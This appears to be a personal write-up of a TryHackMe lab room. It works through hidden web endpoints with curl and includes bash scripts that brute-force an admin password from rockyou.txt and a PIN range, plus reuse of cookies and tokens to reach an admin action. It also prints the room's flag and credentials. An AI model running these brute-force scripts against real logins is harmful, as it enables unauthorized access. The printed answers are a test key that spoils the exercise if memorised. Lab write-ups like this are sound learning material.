📚 [TryHackMe Exploitation with cURL - Hoperation Eggsploit](https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0)


## find the endpoints

````shell
$ curl -i 'http://10.67.175.168/terminal.php?action=panel' 

<h2>Access denied</h2><p>This admin panel is terminal-only and is only accessible using secretcomputer</p>
````

"secretcomputer" is the hint. It must be sent as user-agent:

````shell
curl -i -A 'secretcomputer' 'http://10.67.175.168/terminal.php?action=panel'

{
    "service": "Wormhole Control Panel",
    "endpoints": {
        "\/terminal.php?action=info": "Public info",
        "\/terminal.php?action=login": "POST: username,password",
        "\/terminal.php?action=pin": "POST: attempt PIN to get temporary admin token",
        "\/terminal.php?action=status": "GET: wormhole status",
        "\/terminal.php?action=close": "POST: close wormhole"
    },
    "note": "This panel only answers to terminal user agents. Use the endpoints to fully close the wormhole."
}
````

So the endpoints are:

- http://10.67.175.168/terminal.php?action=info
- http://10.67.175.168/terminal.php?action=login
- http://10.67.175.168/terminal.php?action=pin
- http://10.67.175.168/terminal.php?action=status
- http://10.67.175.168/terminal.php?action=close


## ?action=info

Described as:

> Public info

````shell
curl -i -A 'secretcomputer' 'http://10.67.175.168/terminal.php?action=info'

{
    "title": "Bunny Control Panel",
    "desc": "The rabbits hide the wormhole state and protect closure behind both a session and a token. You will need to authenticate and obtain the operator token."
}
````

"both a session and a token" is the hint. We are gonna need both.


## ?action=login

Described as:

> POST: username,password

Let's try to GET it anyway:

````shell
curl -i -A 'secretcomputer' 'http://10.67.175.168/terminal.php?action=login'

{
    "error": "POST username & password required."
} 
````

The username is likely "admin".

````shell
curl -i -A 'secretcomputer' -X POST -d 'username=admin&password=admin' 'http://10.67.175.168/terminal.php?action=login'

HTTP/1.1 200 OK

{
    "status": "fail",
    "msg": "Invalid credentials."
} 
````

It returns "200", but it's an error. Let's bruteforce looking for a response without "Invalid credentials". There was a hint on the THM page:

> Use rockyou.txt when brute forcing for the password


### attack

````shell
clear && nano attack.sh && bash attack.sh
````

````shell
#!/usr/bin/env bash

if [ -z $(command -v parallel) ]; then sudo apt update && sudo apt install parallel -y; fi

function do_check()
{
  echo -n "."
  pass="$1"

  response=$(curl -s -A 'secretcomputer' -X POST -d "username=admin&password=$pass" 'http://10.67.175.168/terminal.php?action=login')

  if ! echo "$response" | grep -iq "invalid credentials"; then

    echo ""
    echo "$response"
    echo -e "\n---------\n"
    echo "[+] Password found: $pass"

    # Kill the parent parallel process to stop all other attempts
    killall parallel 2>/dev/null
    exit 0
  fi

  exit 1
}

export -f do_check

parallel --jobs 25 --halt now,success=1 do_check :::: /usr/share/wordlists/rockyou.txt
````

It's taking for-fucking-ever!!! Result:

````shell
````


## ?action=pin

Described as:

> POST: attempt PIN to get temporary admin token

Let's try to GET it anyway:

````shell
curl -i -A 'secretcomputer' 'http://10.67.175.168/terminal.php?action=pin'

{
    "error": "POST pin required. ex: curl -X POST -d \"pin=1234\" ..."
}
````

OK, let's POST it:

````shell
curl -i -A 'secretcomputer' -X POST -d 'pin=1234' 'http://10.67.175.168/terminal.php?action=pin'
HTTP/1.1 200 OK

{
    "status": "fail",
    "msg": "Incorrect PIN",
    "attempts": null
}
````

Again: it returns "200", but it's an error. Let's bruteforce looking for a response without "Incorrect PIN". There was a hint on the THM page:

> The PIN is between 4000 and 5000


### attack

````shell
clear && nano attack-pin.sh && bash attack-pin.sh
````

````shell
#!/bin/bash

for pin in {4000..5000}; do

  echo -n '.'

  response=$(curl -s -A 'secretcomputer' -X POST -d "pin=$pin" 'http://10.67.175.168/terminal.php?action=pin')
  #echo "$response"

  if ! echo "$response" | grep -iq "Incorrect PIN"; then

    echo ""
    echo "$response"
    echo -e "\n---------\n"
    echo "[+] PIN found: $pin"
    break

  fi

done
````

Result:

````shell
{
    "status": "ok",
    "operator_token": "5acf4373cd4c031d67aeae6d9023977ea0b92822999ab441733c5718ad236037",
    "note": "This token is valid for the day. Use it as Bearer or X-Operator header."
}

[+] PIN found: 4731
````

The PIN is not relevant here. What's relevant is:

- the token
- "Use it as Bearer or X-Operator header"


## ?action=status

Described as:

> GET: wormhole status

````shell
curl -i -A 'secretcomputer' 'http://10.67.175.168/terminal.php?action=status'

{
    "wormhole": "OPEN",
    "note": "Admin information hidden. Authenticate and obtain operator token."
} 
````

Let's try to use the token (from ?action=pin) "as Bearer or X-Operator header"

````shell
curl -i -A 'secretcomputer' -H 'Authorization: Bearer 5acf4373cd4c031d67aeae6d9023977ea0b92822999ab441733c5718ad236037' 'http://10.67.175.168/terminal.php?action=status'

{
    "wormhole": "OPEN",
    "reinforcements": "ENABLED",
    "last_update": "2025-12-25T15:40:37+00:00",
    "is_admin": "true",
    "operator_token_valid": true
}
````

There isn't anything useful in the response. But we can use it to:

- test if the token is valid
- check for mission success (the "wormhole" would be likely "CLOSED" then)


## ?action=close

Described as:

> POST: close wormhole

**This is the primary objective**

Let's try to GET it anyway:

````shell
curl -i -A 'secretcomputer' 'http://10.67.175.168/terminal.php?action=close'

{
    "error": "POST required to close wormhole."
}
````

````shell
curl -i -A 'secretcomputer' -X POST 'http://10.67.175.168/terminal.php?action=close'

{
    "status": "denied",
    "msg": "Missing admin session, operator token, or X-Force header. All three required."
}
````

We need:

- "admin session": it's likely the cookie returned by the login
- "operator token": it's likely the token from the PIN hack
- "X-Force header": no clue. Let's just try with `X-Force: 1`

Login again to save the cookies:

````shell
curl -i -A 'secretcomputer' -X POST -d 'username=admin&password=stellaris61' -c admin-cookies.txt 'http://10.67.175.168/terminal.php?action=login'

{
    "status": "login_success",
    "msg": "Session cookie set. You still need the operator token to close the wormhole."
}
````


### attack

Use the cookies:

````shell
curl -i -A 'secretcomputer' -X POST -b admin-cookies.txt -H 'Authorization: Bearer 5acf4373cd4c031d67aeae6d9023977ea0b92822999ab441733c5718ad236037' -H 'X-Force: 1' 'http://10.67.175.168/terminal.php?action=close'

{
    "status": "denied",
    "msg": "Missing admin session, operator token, or X-Force header. All three required."
} 
````

It ain't the fuck working. The token hint was:

> Use it as Bearer or X-Operator header

So maybe it's the X-Operator header here?

````shell
curl -i -A 'secretcomputer' -X POST -b admin-cookies.txt -H 'X-Operator: 5acf4373cd4c031d67aeae6d9023977ea0b92822999ab441733c5718ad236037' -H 'X-Force: 1' 'http://10.67.175.168/terminal.php?action=close'

{
    "status": "denied",
    "msg": "Missing admin session, operator token, or X-Force header. All three required."
} 
````

Still an error. Maybe the "X-Force" is wrong. Let's try with "close", to close the wormhole:

````shell
curl -i -A 'secretcomputer' -X POST -b admin-cookies.txt -H 'X-Operator: 5acf4373cd4c031d67aeae6d9023977ea0b92822999ab441733c5718ad236037' -H 'X-Force: close' 'http://10.67.175.168/terminal.php?action=close'

{
    "status": "wormhole_closed",
    "flag": "THM{wormhole_closed_by_curl}",
    "msg": "You closed the wormhole. Reinforcements halted."
}
````

Mission completed!


## mission completed check

````shell
curl -i -A 'secretcomputer' -H 'Authorization: Bearer 5acf4373cd4c031d67aeae6d9023977ea0b92822999ab441733c5718ad236037' 'http://10.67.175.168/terminal.php?action=status'

{
    "wormhole": "OPEN",
    "reinforcements": "ENABLED",
    "last_update": "2025-12-25T18:57:56+00:00",
    "is_admin": "true",
    "operator_token_valid": true
} 
````

It looks like the logic is not connected.
